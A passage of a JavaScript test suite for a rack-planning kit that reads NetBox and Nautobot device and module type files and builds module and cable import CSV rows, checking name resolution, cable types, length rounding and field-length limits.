import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import * as D from '../../../kit/rack/dcim-rules.js';
import * as X from '../../../kit/rack/export-data.js';
import * as M from '../../../kit/rack/model.js';

// The vendored type files, read as text - what the page fetches.
const EXPORTS = new URL('../../../library/exports/', import.meta.url);
const yaml = path => fs.readFileSync(new URL(path, EXPORTS), 'utf8');
// Upstream has no files.json (the site writes one when it vendors the tree): the same listing, read off the tree.
const filesOf = () => Object.fromEntries(['netbox', 'nautobot'].map(target => [target,
  fs.readdirSync(new URL(`${target}/`, EXPORTS), {recursive: true}).filter(p => p.endsWith('.yaml')).sort()
    .map(p => `${target}/${p}`)]));
const lists = path => D.typeLists(yaml(path));
const ASR = 'netbox/device-types/Cisco/ASR-9006-AC-V2.yaml', LEAF = 'netbox/device-types/Edgecore/7726-32X-O-AC-F.yaml',
  TM = 'netbox/device-types/BATM-Telco Systems/TM-280.yaml', CARD = 'netbox/module-types/Cisco/A9K-16X100GE-TR.yaml';

test('a type file gives its own name lists, by section, and its bays by name and position', () => {
  const tm = lists(TM);
  assert.equal(tm.manufacturer, 'BATM/Telco Systems');
  assert.equal(tm.model, 'TM-280');
  assert.deepEqual(tm.sections.interfaces, ['port-1-1', 'port-2-1', 'port-3-1', 'copper-3-1', 'port-2-2']);
  assert.deepEqual(tm.sections['console-ports'], ['Console']);
  assert.deepEqual(tm.sections['power-ports'], ['dc-in']);
  assert.deepEqual(tm.bays, []);
  const asr = lists(ASR);
  assert.deepEqual(asr.sections.interfaces, []);
  assert.deepEqual(asr.bays.find(b => b.position === 'slot-2'), {name: 'slot-2', position: 'slot-2'});
  assert.equal(asr.bays.length, 11);
  // A quoted name is read without its quotes; a name is not a path until a bay's position replaces {module}.
  assert.deepEqual(lists(CARD).sections.interfaces.slice(0, 2), ['{module}/p0', '{module}/p1']);
  // A bay's name is for display; its position is the drawing's bay id.
  assert.deepEqual(lists(LEAF).bays[0], {name: 'Fan 1', position: 'fan-1'});
  assert.deepEqual(D.bayAt(lists('netbox/device-types/Casa Systems/C40G-CHASSIS-AC.yaml'), 'front-0'),
    {name: 'Front 0', position: 'front-0'});
  assert.equal(D.bayAt(lists(LEAF), 'Fan 1'), null);
  // Not a type file at all: empty lists, never a throw.
  assert.deepEqual(D.typeLists('').sections.interfaces, []);
  assert.deepEqual(D.typeLists(undefined).bays, []);
});

test('the NetBox and Nautobot copies of the fixture types name the same things', () => {
  for (const p of [ASR, LEAF, TM, CARD]) {
    const nb = lists(p), nt = lists(p.replace(/^netbox\//, 'nautobot/'));
    assert.deepEqual(nt.sections, nb.sections, p);
    assert.deepEqual(nt.bays, nb.bays, p);
  }
});

test("the fixture's cable ends resolve to the names the real instances made", () => {
  const leaf = lists(LEAF), asr = lists(ASR), tm = lists(TM), card = lists(CARD);
  for (const path of ['port-1', 'port-2', 'mgmt-eth'])
    assert.deepEqual(D.resolveEnd({path, device: leaf}), {ok: true, name: path, type: 'dcim.interface'});
  assert.deepEqual(D.resolveEnd({path: 'port-2-1', device: tm}), {ok: true, name: 'port-2-1', type: 'dcim.interface'});
  // result.json, inventory_after_modules: the card in slot-2 gave core-1 the interfaces slot-2/p0 to slot-2/p15.
  assert.deepEqual(D.resolveEnd({path: 'slot-2/module/p0', device: asr, moduleAt: bay => (bay === 'slot-2' ? card : null)}),
    {ok: true, name: 'slot-2/p0', type: 'dcim.interface', bay: {name: 'slot-2', position: 'slot-2'}});
  assert.deepEqual(D.resolveEnd({path: 'dc-in', device: tm}), {ok: true, name: 'dc-in', type: 'dcim.powerport'});
});

test('a console port is found by its own list, never by its path alone', () => {
  const tm = lists(TM);
  // The drawing calls it "con"; the type file calls its only console port "Console".
  assert.deepEqual(D.resolveEnd({path: 'con', device: tm, consoles: ['con']}),
    {ok: true, name: 'Console', type: 'dcim.consoleport'});
  // Two drawn, one listed: which one is it? Not said.
  assert.deepEqual(D.resolveEnd({path: 'con', device: tm, consoles: ['con', 'con-usb']}),
    {ok: false, reason: 'the device type TM-280 does not say which of its console ports con is'});
  // Not drawn as a console at all: it is just a path the file does not list.
  assert.deepEqual(D.resolveEnd({path: 'con', device: tm}),
    {ok: false, reason: 'the device type TM-280 lists no port named con'});
  // "Console (<path>)" names it exactly.
  const two = D.typeLists('model: X\nconsole-ports:\n  - name: Console (usb)\n  - name: Console (rj45)\n');
  assert.deepEqual(D.resolveEnd({path: 'usb', device: two, consoles: ['usb', 'rj45']}),
    {ok: true, name: 'Console (usb)', type: 'dcim.consoleport'});
});

test('an end that does not resolve says why, and gets no name', () => {
  const asr = lists(ASR), card = lists(CARD), leaf = lists(LEAF);
  const why = arg => { const r = D.resolveEnd(arg); assert.equal(r.ok, false); assert.equal('name' in r, false); return r.reason; };
  assert.equal(why({path: 'port-1', device: null}), 'its device has no device type');
  assert.equal(why({path: 'port-99', device: leaf}), 'the device type 7726-32X-O-AC-F lists no port named port-99');
  assert.equal(why({path: 'slot-9/module/p0', device: asr, moduleAt: () => card}),
    'the device type ASR-9006-AC-V2 has no module bay at position slot-9');
  assert.equal(why({path: 'slot-2/module/p0', device: asr}), 'what is seated in slot-2 has no module type');
  assert.equal(why({path: 'slot-2/module/p99', device: asr, moduleAt: () => card}),
    'the module type A9K-16X100GE-TR lists no port named {module}/p99');
  assert.equal(why({path: 'slot-2/module/mic-0/module/p0', device: asr, moduleAt: () => card}),
    'it is a port of a module inside a card, and the card has no module bay to import that module into');
  // The Edgecore AS7326-56X draws port-57 where its type file lists "57": no convention bridges that.
  assert.equal(why({path: 'port-57', device: lists('netbox/device-types/Edgecore/7326-56X-O-48V-B.yaml')}),
    'the device type 7326-56X-O-48V-B lists no port named port-57');
});

test('the list a name is in gives the end its type: a cassette has front and rear ports, not interfaces', () => {
  const cassette = lists('netbox/module-types/FS.com/FHD-1MTP6LCDOS2A.yaml');
  const dev = D.typeLists('model: Panel\nmodule-bays:\n  - name: Bay 1\n    position: bay-1\n');
  assert.deepEqual(D.resolveEnd({path: 'bay-1/module/1', device: dev, moduleAt: () => cassette}),
    {ok: true, name: 'bay-1/1', type: 'dcim.frontport', bay: {name: 'Bay 1', position: 'bay-1'}});
  assert.deepEqual(D.resolveEnd({path: 'bay-1/module/MTP-1', device: dev, moduleAt: () => cassette}),
    {ok: true, name: 'bay-1/MTP-1', type: 'dcim.rearport', bay: {name: 'Bay 1', position: 'bay-1'}});
  // The drawing's own name for that adapter is lc1, which the file does not list.
  assert.equal(D.resolveEnd({path: 'bay-1/module/lc1', device: dev, moduleAt: () => cassette}).reason,
    'the module type FHD-1MTP6LCDOS2A lists no port named {module}/lc1');
});

// A module port carries {module}/ once. Nautobot alone (upstream f4b799300, #765/#834) names a module seated only
// in a nested bay by its bay chain, outermost first: {module.parent}/{module}/x at depth 2,
// {module.parent.parent}/{module.parent}/{module}/x at depth 3. NetBox keeps the single {module}/.
const modulePortName = target => target === 'nautobot'
  ? /^(\{module(\.parent)+\}\/)*\{module\}\/(?!.*\{module)/
  : /^\{module\}\/(?!.*\{module)/;

test('every vendored type file is read whole: each "- name:" line is a name, a module port carries {module}/ once', () => {
  const files = filesOf();
  let n = 0;
  for (const target of ['netbox', 'nautobot']) for (const path of files[target]) {
    const text = yaml(path), l = D.typeLists(text);
    const named = Object.values(l.sections).reduce((s, v) => s + v.length, 0) + l.bays.length;
    assert.equal(named, text.split('\n').filter(x => x.startsWith('  - name:')).length, path);
    assert.ok(l.model, path);
    assert.equal(new Set(l.bays.map(b => b.position)).size, l.bays.length, `${path}: two bays share a position`);
    if (path.includes('/module-types/'))
      for (const name of Object.values(l.sections).flat())
        assert.ok(modulePortName(target).test(name), `${path}: ${name}`);
    n++;
  }
  assert.ok(n > 2000, `${n} files`);
});

// Expected values read off the files with awk, NOT with typeLists: the identity lines, and for a section its
// count and its first and last name; for the bays their count and the first and last position.
test('identity spot checks: thirteen vendored files across vendors read to exactly what their lines say', () => {
  const spot = [
    ['netbox/device-types/Juniper/MX10003.yaml', 'Juniper', 'MX10003', {}, [14, 'ft0', 're1']],
    ['netbox/device-types/Dell/PowerEdge R660 e3s14-rc0-none.yaml', 'Dell', 'PowerEdge R660 e3s14-rc0-none', {}, [59, 'fan-1', 'riser-blank-none']],
    ['netbox/device-types/HPE/878972-B21.yaml', 'HPE', '878972-B21', {interfaces: [3, 'ilo', 'nic-2']}, [34, 'fan-1', 'serial']],
    ['netbox/device-types/Nokia/7360 ISAM FX-16.yaml', 'Nokia', '7360 ISAM FX-16', {interfaces: [1, 'tod', 'tod']}, [20, 'fan', 'ntio']],
    ['netbox/device-types/Celestica/R3059-F9021-A1.yaml', 'Celestica', 'R3059-F9021-A1',
      {interfaces: [57, 'mgmt', 'port-56'], 'console-ports': [1, 'Console', 'Console']}, [2, 'psu-1', 'psu-2']],
    ['netbox/device-types/Arrcus/7326-56X-O-48V-B.yaml', 'Arrcus', '7326-56X-O-48V-B',
      {interfaces: [59, 'ma1', 'swp56'], 'console-ports': [2, 'Console', 'Console (USB-C)']}, [8, 'fan-1', 'psu-2']],
    ['netbox/device-types/UfiSpace/S6301-56ST.yaml', 'UfiSpace', 'S6301-56ST',
      {interfaces: [57, 'mgmt', 'port-55'], 'console-ports': [1, 'Console', 'Console']}, [4, 'fan-0', 'psu-1']],
    ['netbox/device-types/FS.com/FHD-1UBE.yaml', 'FS.com', 'FHD-1UBE', {}, [4, 'bay-1', 'bay-4']],
    ['netbox/device-types/Edgecore/5912-54X-O-48V-B.yaml', 'Edgecore', '5912-54X-O-48V-B',
      {interfaces: [55, 'mgmt-eth', 'port-54'], 'console-ports': [1, 'Console', 'Console']}, [8, 'fan-1', 'psu-2']],
    ['nautobot/device-types/Cisco/ASR 9001 Router.yaml', 'Cisco', 'ASR 9001 Router',
      // two console ports since upstream c8aa39081 (#384: an AUX line reaches the export)
      {interfaces: [12, 'svc-lan', 'tod'], 'console-ports': [2, 'Console', 'AUX']}, [5, 'fan-0', 'mpa-1']],
    ['nautobot/device-types/Juniper/MX10004.yaml', 'Juniper', 'MX10004', {}, [11, 'fan0', 're1']],
    ['netbox/module-types/Cisco/A99-10X400GE-X-SE.yaml', 'Cisco', 'A99-10X400GE-X-SE', {interfaces: [10, '{module}/p0', '{module}/p9']}, null],
    ['netbox/module-types/HPE/expansion-slot-blank-fh.yaml', 'HPE', 'expansion-slot-blank-fh', {}, null]];
  for (const [path, manufacturer, model, sections, bays] of spot) {
    const l = lists(path);
    assert.deepEqual([l.manufacturer, l.model], [manufacturer, model], path);
    for (const [name, list] of Object.entries(l.sections)) {
      const want = sections[name];
      assert.deepEqual(want ? [list.length, list[0], list.at(-1)] : [list.length], want ?? [0], `${path} ${name}`);
    }
    assert.deepEqual(bays ? [l.bays.length, l.bays[0].position, l.bays.at(-1).position] : [l.bays.length], bays ?? [0], `${path} bays`);
    // A bay's name is for display; where it has none of its own, name and position are the file's two lines.
    if (bays) assert.ok(l.bays.every(b => b.name && b.position), path);
  }
  // A bay's name and position together, as the file writes them.
  assert.deepEqual(lists('netbox/device-types/Celestica/R3059-F9021-A1.yaml').bays, [{name: 'PSU 1', position: 'psu-1'}, {name: 'PSU 2', position: 'psu-2'}]);
  assert.deepEqual(lists('netbox/device-types/Dell/PowerEdge R660 e3s14-rc0-none.yaml').bays[0], {name: 'Fan 1', position: 'fan-1'});
});

test('a Nautobot module port may carry its bay chain, once and outermost first (upstream f4b799300)', () => {
  const nb = modulePortName('nautobot'), nx = modulePortName('netbox');
  for (const ok of ['{module}/p0', '{module.parent}/{module}/p0', '{module.parent.parent}/{module.parent}/{module}/p0'])
    assert.ok(nb.test(ok), ok);
  for (const bad of ['p0', '{module.parent}/p0', '{module}/{module}/p0', '{module.parent}/{module}/{module}/p0', '{module}/{module.parent}/p0'])
    assert.ok(!nb.test(bad), bad);
  assert.ok(nx.test('{module}/p0') && !nx.test('{module.parent}/{module}/p0'));
});

test('a YAML-only escape in a quoted value costs that value, not the type read', () => {
  const got = D.typeLists('manufacturer: "Acme"\nmodel: "M\\e1"\ninterfaces:\n  - name: "p\\x1b0"\n  - name: "fine\\u00e9"\n  - name: \'it\'\'s\'\n');
  assert.deepEqual([got.manufacturer, got.model], ['Acme', 'M\\e1']);
  assert.deepEqual(got.sections.interfaces, ['p\\x1b0', 'fineé', "it's"]);
});

// ── the modules and cables files ────────────────────────────────────────
// check-browser.py's cable fixture, as far as the rules read it.
const FRAME = M.normalizeFrame({heightRU: 24});
const ITEMS = [
  {id: 'i1', ref: 'asr-9006', cfg: 'base', label: 'core-1', ru: 2, u: 10, face: 'front', turned: false},
  {id: 'i2', ref: 'as7726-32x', cfg: 'ac-f2b', label: 'leaf-1', ru: 14, u: 1, face: 'front', turned: false},
  {id: 'i3', ref: 'tm-280', cfg: 'base', label: 'demarc', ru: 14, u: 1, face: 'rear', turned: false},
  {id: 'i4', ref: 'tm-280', cfg: 'base', label: 'demarc', ru: 20, u: 1, face: 'rear', turned: false}];
const end = (item, path) => ({item, path, view: 'front'});
const CABLES = [
  {id: 'c1', a: end('i2', 'port-1'), b: end('i1', 'slot-2/module/p0'), media: 'os2', purpose: 'uplink', label: 'A1',
   length: {value: 2, unit: 'm', source: 'entered'}, route: []},
  {id: 'c2', a: end('i2', 'mgmt-eth'), b: end('i3', 'port-2-1'), media: 'cat6a', purpose: 'management', label: '', route: []},
  {id: 'c3', a: end('i2', 'port-2'), b: end('i4', 'port-2-1'), media: 'os2', purpose: 'uplink', label: '', route: []}];
const RACK = {name: 'Cable test', frame: FRAME, zeroU: [], items: ITEMS, cables: CABLES};
const NAMES = X.uniqueNames(ITEMS);
const DEVICE = {i1: lists(ASR), i2: lists(LEAF), i3: lists(TM), i4: lists(TM)};
const CARD_TYPE = {manufacturer: 'Cisco', model: 'A9K-16X100GE-TR', lists: lists(CARD)};
const PARTS = [{itemId: 'i1', path: 'slot-2/module', ref: 'cisco/a9k-16x100ge-tr@1'},
               {itemId: 'i1', path: 'slot-2/module/p0-occupant', ref: 'generic/qsfp-lc@2'},
               {itemId: 'i2', path: 'port-1-occupant', ref: 'generic/qsfp-lc@2'}];
const moduleOf = ref => (ref === 'cisco/a9k-16x100ge-tr@1' ? CARD_TYPE : null);
const resolve = e => D.resolveEnd({path: e.path, device: DEVICE[e.item], consoles: ['con'],
  moduleAt: bay => (e.item === 'i1' && bay === 'slot-2' ? CARD_TYPE.lists : null)});
// Every end lands, except leaf-1 port-2: an empty cage.
const landed = (cables, loose = {}) => new Map(cables.flatMap(c => [c.a, c.b]).map(e =>
  [`${e.item}|${e.view}|${e.path}`, {info: null, reason: loose[`${e.item}|${e.path}`] ?? null}]));
const ENDS = landed(CABLES, {'i2|port-2': 'port-2 holds no optic'});
const ALL = new Set(['i1', 'i2', 'i3', 'i4']), NETBOX_KEPT = new Set(['i1', 'i2', 'i4']);
const cableRows = (over = {}) => D.cableImportRows({rack: RACK, target: 'netbox', names: NAMES, kept: NETBOX_KEPT, resolve,
  ends: ENDS, ...over});

test('the modules file: one row per card in a bay, by the bay NAME; an optic is not a module', () => {
  const nb = D.moduleImportRows({target: 'netbox', parts: PARTS, names: NAMES, kept: ALL, deviceOf: id => DEVICE[id], moduleOf});
  // result.json: NetBox took exactly these columns (status is required; a manufacturer column is refused).
  assert.deepEqual(nb, {columns: ['device', 'module_bay', 'module_type', 'status'], left: [],
    rows: [{device: 'core-1', module_bay: 'slot-2', module_type: 'A9K-16X100GE-TR', status: 'planned'}]});
  const nt = D.moduleImportRows({target: 'nautobot', parts: PARTS, names: NAMES, kept: ALL, deviceOf: id => DEVICE[id], moduleOf});
  assert.deepEqual(nt.columns, ['module_type__manufacturer__name', 'module_type__model',
    'parent_module_bay__parent_device__name', 'parent_module_bay__name', 'status__name']);
  assert.deepEqual(nt.rows, [{module_type__manufacturer__name: 'Cisco', module_type__model: 'A9K-16X100GE-TR',
    parent_module_bay__parent_device__name: 'core-1', parent_module_bay__name: 'slot-2', status__name: 'Planned'}]);
});

test('the modules file names a bay by its name, found by its position; what it cannot carry is said', () => {
  const fan = {manufacturer: 'Edgecore', model: 'FAN-F', lists: D.typeLists('model: FAN-F\n')};
  const parts = [{itemId: 'i2', path: 'fan-1/module', ref: 'fan'},                // name "Fan 1", position fan-1
                 {itemId: 'i2', path: 'nowhere/module', ref: 'fan'},              // no bay at that position
                 {itemId: 'i1', path: 'slot-2/module/mic-0/module', ref: 'fan'},  // a module inside a card
                 {itemId: 'i3', path: 'bay/module', ref: 'fan'}, {itemId: 'i3', path: 'bay-2/module', ref: 'fan'},
                 {itemId: 'i4', path: 'bay/module', ref: 'no-type'}];
  const got = D.moduleImportRows({target: 'netbox', parts, names: NAMES, kept: NETBOX_KEPT, deviceOf: id => DEVICE[id],
    moduleOf: ref => (ref === 'fan' ? fan : null)});
  assert.deepEqual(got.rows, [{device: 'leaf-1', module_bay: 'Fan 1', module_type: 'FAN-F', status: 'planned'}]);
  assert.deepEqual(got.left, [
    'leaf-1 nowhere: FAN-F is not in the modules file. The device type 7726-32X-O-AC-F has no module bay at position nowhere.',
    'core-1 slot-2/module/mic-0: FAN-F is not in the modules file. It is a module inside a card, and no module type here has a module bay to import it into.',
    'The modules of demarc-i3 are not in the modules file: demarc-i3 is not in the devices file.']);
});

test('media become cable types both targets accepted; anything else is blank', () => {
  assert.deepEqual(['os2', 'om3', 'om4', 'om5', 'cat6', 'cat6a', 'dac', 'aoc'].map(D.cableType),
    ['smf-os2', 'mmf-om3', 'mmf-om4', 'mmf-om5', 'cat6', 'cat6a', 'dac-passive', 'aoc']);
  assert.deepEqual(['', undefined, null, 'copper', 'toString', 'smf-os2'].map(D.cableType), ['', '', '', '', '', '']);
});

test('a length is written in m or ft, rounded up to what the target stores', () => {
  const len = (value, unit) => ({length: {value, unit, source: 'entered'}});
  assert.deepEqual(D.importLength(len(2, 'm'), 'netbox'), {value: 2, unit: 'm', note: null});
  assert.deepEqual(D.importLength(len(1.5, 'ft'), 'netbox'), {value: 1.5, unit: 'ft', note: null});
  assert.deepEqual(D.importLength(len(0.07, 'm'), 'netbox'), {value: 0.07, unit: 'm', note: null});
  assert.deepEqual(D.importLength(len(1.234, 'm'), 'netbox'), {value: 1.24, unit: 'm',
    note: '1.234 m is written as 1.24 m: NetBox keeps two decimal places, and a length is rounded up'});
  // result.json: Nautobot answered 1.5 with "A valid integer is required."
  assert.deepEqual(D.importLength(len(1.5, 'ft'), 'nautobot'), {value: 2, unit: 'ft',
    note: '1.5 ft is written as 2 ft: Nautobot takes whole numbers, and a length is rounded up'});
  assert.deepEqual(D.importLength(len(3, 'm'), 'nautobot'), {value: 3, unit: 'm', note: null});
  assert.deepEqual(D.importLength(len(30, 'cm'), 'netbox'), {value: '', unit: '',
    note: 'its length (30 cm) is not carried: the kit writes lengths in m or ft only'});
  assert.deepEqual(D.importLength({}, 'netbox'), {value: '', unit: '', note: null});
  assert.deepEqual(D.importLength({lengthAsWritten: 'long'}, 'nautobot'), {value: '', unit: '',
    note: 'its length as written in the rack file is not carried'});
});

test('which ends one cable may join', () => {
  assert.ok(D.canMeet('dcim.interface', 'dcim.interface') && D.canMeet('dcim.interface', 'dcim.frontport'));
  assert.ok(D.canMeet('dcim.consoleport', 'dcim.rearport') && D.canMeet('dcim.powerport', 'dcim.poweroutlet'));
  assert.ok(!D.canMeet('dcim.consoleport', 'dcim.interface') && !D.canMeet('dcim.interface', 'dcim.consoleport'));
  assert.ok(!D.canMeet('dcim.interface', 'dcim.powerport') && !D.canMeet('dcim.nonsense', 'dcim.interface'));
});

test("NetBox's cables file: the columns the real instance took, and only rows it would take", () => {
  const got = cableRows();
  assert.deepEqual(got.columns, ['side_a_device', 'side_a_type', 'side_a_name', 'side_b_device', 'side_b_type',
    'side_b_name', 'type', 'status', 'label', 'color', 'length', 'length_unit', 'description']);
  // The row result.json's cables_good imported, device names apart.
  assert.deepEqual(got.rows, [{side_a_device: 'leaf-1', side_a_type: 'dcim.interface', side_a_name: 'port-1',
    side_b_device: 'core-1', side_b_type: 'dcim.interface', side_b_name: 'slot-2/p0', type: 'smf-os2', status: 'planned',
    label: 'A1', color: '', length: 2, length_unit: 'm', description: 'uplink'}]);
  assert.equal(X.toCsv(got.columns, got.rows).split('\r\n')[1],
    'leaf-1,dcim.interface,port-1,core-1,dcim.interface,slot-2/p0,smf-os2,planned,A1,,2,m,uplink');
  assert.deepEqual(got.left, [
    'Cable c2 is not in the cables file: end B is on demarc-i3, which is not in the devices file.',
    'Cable c3 is not in the cables file: end A, leaf-1 (U14) port-2, is not connected (port-2 holds no optic).']);
  assert.deepEqual(got.notes, []);
});

test("Nautobot's cables file is for the script: ends by name, every device kept, whole lengths", () => {
  const cables = [...CABLES, {id: 'c4', a: end('i4', 'port-2-2'), b: end('i3', 'port-2-2'), media: 'cat6', purpose: '', label: '',
    length: {value: 1.5, unit: 'ft', source: 'entered'}, route: []}];
  const rack = {...RACK, cables};
  const got = D.cableImportRows({rack, target: 'nautobot', names: NAMES, kept: ALL, resolve,
    ends: landed(cables, {'i2|port-2': 'port-2 holds no optic'})});
  assert.deepEqual(got.columns, ['a_device', 'a_type', 'a_name', 'b_device', 'b_type', 'b_name', 'type', 'status', 'label',
    'color', 'length', 'length_unit']);
  assert.deepEqual(got.rows.map(r => Object.values(r).join('|')), [
    'leaf-1|dcim.interface|port-1|core-1|dcim.interface|slot-2/p0|smf-os2|Planned|A1||2|m',
    'leaf-1|dcim.interface|mgmt-eth|demarc-i3|dcim.interface|port-2-1|cat6a|Planned|c2|||',
    'demarc-i4|dcim.interface|port-2-2|demarc-i3|dcim.interface|port-2-2|cat6|Planned|c4||2|ft']);
  assert.deepEqual(got.left, ['Cable c3 is not in the cables file: end A, leaf-1 (U14) port-2, is not connected (port-2 holds no optic).']);
  assert.deepEqual(got.notes, ['Cable c4: 1.5 ft is written as 2 ft: Nautobot takes whole numbers, and a length is rounded up.']);
});

test('a cable the target would refuse is left out, each with its reason', () => {
  const one = (cable, over = {}) => {
    const rack = {...RACK, cables: [cable]};
    return D.cableImportRows({rack, target: 'netbox', names: NAMES, kept: ALL, resolve, ends: landed([cable]), ...over, rack: over.rack || rack});
  };
  const cab = (a, b, more = {}) => ({id: 'c9', a, b, media: 'cat6', purpose: '', label: 'X', route: [], ...more});
  // Console port to interface: result.json, "Incompatible termination types: consoleport and interface".
  assert.deepEqual(one(cab(end('i4', 'con'), end('i2', 'mgmt-eth'))).left,
    ['Cable X is not in the cables file: NetBox does not cable a console port to an interface.']);
  assert.match(one(cab(end('i4', 'con'), end('i2', 'mgmt-eth')), {target: 'nautobot'}).left[0], /Nautobot does not cable a console port to an interface\.$/);
  // An end the type file does not name, with the reason the resolution gives.
  assert.deepEqual(one(cab(end('i2', 'port-99'), end('i4', 'port-2-1'))).left,
    ['Cable X is not in the cables file: end A, leaf-1 (U14) port-99: the device type 7726-32X-O-AC-F lists no port named port-99.']);
  // Ends that could not be checked: none is written. A loose end might be among them.
  assert.deepEqual(one(cab(end('i2', 'port-1'), end('i4', 'port-2-1')), {unchecked: true}).left,
    ['Cable X is not in the cables file: its ends could not be checked.']);
  assert.deepEqual(one(cab(end('i2', 'port-1'), end('i4', 'port-2-1')), {ends: new Map()}).left,
    ['Cable X is not in the cables file: its ends could not be checked.']);
  // A removed device is a loose end, in the words the other exports use.
  const gone = cab(end('i9', 'port-1'), end('i4', 'port-2-1'));
  assert.deepEqual(one(gone, {ends: landed([gone], {'i9|port-1': 'the device was removed'})}).left,
    ["Cable X is not in the cables file: end A, a removed device's port-1, is not connected (the device was removed)."]);
  // A comma in a device name: NetBox would read two devices. Nautobot's script looks the name up whole.
  const items = ITEMS.map(i => (i.id === 'i2' ? {...i, label: 'leaf, one'} : i));
  const rack = {...RACK, items, cables: [cab(end('i2', 'port-1'), end('i4', 'port-2-1'))]};
  const over = {rack, names: X.uniqueNames(items), ends: landed(rack.cables)};
  assert.deepEqual(one(rack.cables[0], over).left,
    ['Cable X is not in the cables file: end A: NetBox reads a comma in a device or port name as a list, so "leaf, one" cannot be written.']);
  assert.equal(one(rack.cables[0], {...over, target: 'nautobot'}).rows[0].a_device, 'leaf, one');
});

test('one port, one cable in the file; a label, or the id; an unknown media and a DAC are said', () => {
  const cab = (id, a, b, more = {}) => ({id, a, b, media: 'cat6', purpose: '', label: '', route: [], ...more});
  const cables = [cab('c1', end('i2', 'mgmt-eth'), end('i4', 'port-2-1')),
                  cab('c2', end('i4', 'port-2-1'), end('i2', 'port-3'), {label: 'second'}),
                  cab('c3', end('i2', 'port-4'), end('i2', 'port-5'), {media: 'dac'}),
                  cab('c4', end('i2', 'port-6'), end('i2', 'port-7'), {media: 'coax'}),
                  cab('c5', end('i2', 'port-8'), end('i2', 'port-9'), {media: ''})];
  const got = D.cableImportRows({rack: {...RACK, cables}, target: 'netbox', names: NAMES, kept: ALL, resolve, ends: landed(cables)});
  assert.deepEqual(got.rows.map(r => [r.label, r.type]), [['c1', 'cat6'], ['c3', 'dac-passive'], ['c4', ''], ['c5', '']]);
  assert.deepEqual(got.left, ['Cable second is not in the cables file: end A, demarc (U20) port-2-1, already has cable c1 in this file.']);
  assert.deepEqual(got.notes, ['Cable c4: its media (coax) has no NetBox cable type, so its type is blank.',
    'A DAC is written as dac-passive. Change the type of one that is active.']);
});

test('a rack with no cables gets a header and no rows', () => {
  const got = D.cableImportRows({rack: {...RACK, cables: []}, target: 'netbox', names: NAMES, kept: ALL, resolve});
  assert.deepEqual([got.rows, got.left, got.notes], [[], [], []]);
  assert.equal(X.toCsv(got.columns, got.rows),
    'side_a_device,side_a_type,side_a_name,side_b_device,side_b_type,side_b_name,type,status,label,color,length,length_unit,description\r\n');
});

// ── what a DCIM stores: the limits (Phase 2c fix round) ─────────────────
test('the limits are one table', () => {
  assert.deepEqual(D.DCIM_LIMITS, {deviceName: 64, cableLabel: 100, cableDescription: 200, netboxLengthBelow: 1000000, nautobotLengthMax: 32767});
  assert.equal(D.DCIM_LIMITS, X.DCIM_LIMITS);
});

test('device names that differ only by case are made unique, in one place that every file reads', () => {
  const items = [{id: 'i1', label: 'Leaf', ref: 'r'}, {id: 'i2', label: 'leaf', ref: 'r'}, {id: 'i3', label: 'leaf-i1', ref: 'r'},
                 {id: 'i4', label: 'LEAF-I1', ref: 'r'}];
  const names = [...X.uniqueNames(items).values()].map(v => v.name);
  assert.equal(new Set(names.map(n => n.toLowerCase())).size, 4, names.join(', '));
  assert.ok(X.uniqueNames(items).get('i1').renamed && X.uniqueNames(items).get('i2').renamed);
  // "leaf-i1" and "LEAF-I1" are twins of each other, and what "Leaf" becomes cannot meet them.
  assert.ok(!names.slice(0, 2).some(n => /^leaf-i1$/i.test(n)), names.join(', '));
  // A label alone in its case-insensitive group is not renamed.
  assert.equal(X.uniqueNames([{id: 'a', label: 'Leaf', ref: 'r'}, {id: 'b', label: 'spine', ref: 'r'}]).get('a').name, 'Leaf');
  // The devices file and the cable schedule take the same names.
  const rack = {name: 'R', frame: FRAME, zeroU: [], items: items.map(i => ({...i, cfg: 'base', ru: 2 + Number(i.id[1]), u: 1, face: 'front'}))};
  const types = new Map(rack.items.map(i => [i.id, {manufacturer: 'M', model: 'T', isFullDepth: false}]));
  const dev = X.deviceImportRows({rack, items: rack.items, types}).rows.map(r => r.name).sort();
  assert.deepEqual(dev, [...names].sort());
});

test('a device name over 64 characters is left out, and said; at and under the limit it stays', () => {
  const it = label => ({id: 'i1', ref: 'tm-280', cfg: 'base', label, ru: 2, u: 1, face: 'front', turned: false});
  const types = new Map([['i1', {manufacturer: 'M', model: 'T', isFullDepth: false}]]);
  const rows = (label, target) => X.deviceImportRows({rack: RACK, items: [it(label)], types, target});
  for (const n of [1, 63, 64]) assert.equal(rows('x'.repeat(n), 'netbox').rows.length, 1, `${n}`);
  const over = rows('x'.repeat(65), 'netbox');
  assert.deepEqual([over.rows.length, over.left.length], [0, 1]);
  assert.equal(over.left[0].reason, `${'x'.repeat(24)}... is not in the devices file: its name is 65 characters, and NetBox allows 64. Shorten its label and export again.`);
  // Nautobot's own limit is not in the facts file: the NetBox one is applied, and the line says so.
  assert.equal(rows('x'.repeat(64), 'nautobot').rows.length, 1);
  assert.match(rows('x'.repeat(65), 'nautobot').left[0].reason, /NetBox allows 64 \(a NetBox limit, applied to Nautobot too\)\./);
  // Counted in characters, not UTF-16 units: 64 astral characters are 64.
  assert.equal(rows('\u{1F600}'.repeat(64), 'netbox').rows.length, 1);
  assert.equal(rows('\u{1F600}'.repeat(65), 'netbox').rows.length, 0);
  // What depends on a left-out device goes with it (the kit's `kept`): its cable and its modules.
  const long = 'y'.repeat(65), items = ITEMS.map(i => (i.id === 'i2' ? {...i, label: long} : i));
  const names = X.uniqueNames(items), kept = new Set(['i1', 'i3', 'i4']);
  const cab = D.cableImportRows({rack: {...RACK, items}, target: 'netbox', names, kept, resolve, ends: ENDS});
  assert.match(cab.left[0], /^Cable A1 is not in the cables file: end A is on y{65}, which is not in the devices file\.$/);
});

test('a cable label over 100 and a description over 200 are shortened to the limit; the cable stays', () => {
  const cab = more => ({id: 'c9', a: end('i2', 'port-1'), b: end('i4', 'port-2-1'), media: 'cat6', purpose: '', label: 'X', route: [], ...more});
  const run = (more, target = 'netbox') => {
    const cables = [cab(more)];
    return D.cableImportRows({rack: {...RACK, cables}, target, names: NAMES, kept: ALL, resolve, ends: landed(cables)});
  };
  for (const n of [99, 100]) { const g = run({label: 'l'.repeat(n)}); assert.deepEqual([g.rows[0].label.length, g.notes], [n, []], `${n}`); }
  const over = run({label: 'l'.repeat(101)});
  assert.equal(over.rows.length, 1);
  assert.equal(over.rows[0].label, 'l'.repeat(100));
